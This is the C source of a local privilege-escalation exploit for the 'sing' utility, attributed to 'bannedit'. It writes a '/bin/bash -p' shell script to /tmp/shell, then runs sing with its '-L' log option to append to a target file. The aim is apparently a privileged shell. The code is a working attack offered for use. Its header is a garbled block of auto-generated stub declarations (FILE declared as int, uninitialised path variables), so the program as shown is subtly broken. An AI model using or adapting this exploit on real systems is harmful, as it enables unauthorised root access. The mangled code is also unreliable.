
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int SING_PATH ;
 int evilname ;
 int execl (int ,int ,char*,char*,char*,char*,int ,char*,int ) ;
 int exit (int) ;
 int fclose (int *) ;
 int file ;
 int * fopen (char*,char*) ;
 int fputs (char*,int *) ;
 int printf (char*) ;
 int puts (char*) ;
 int sleep (int) ;
 int system (char*) ;

int main()
{
FILE *fp;
int pid;

        puts("sing file append exploit");
        puts("------------------------");
        puts("by bannedit");

        if(fp = fopen("/tmp/shell", "w+"))
        {
           fputs("#!/bin/bash\n", fp);
           fputs("/bin/bash -p", fp);
           fclose(fp);
           system("touch /tmp/sing; echo garbage >> /tmp/sing");
        }
        else
        {
           puts("error making shell file");
           exit(-1);
        }

        sleep(5);
        printf("done sleeping...\n");
        execl(SING_PATH, evilname, "-Q", "-c", "1", "-L", file, "localhost", 0);
        return 0;
}
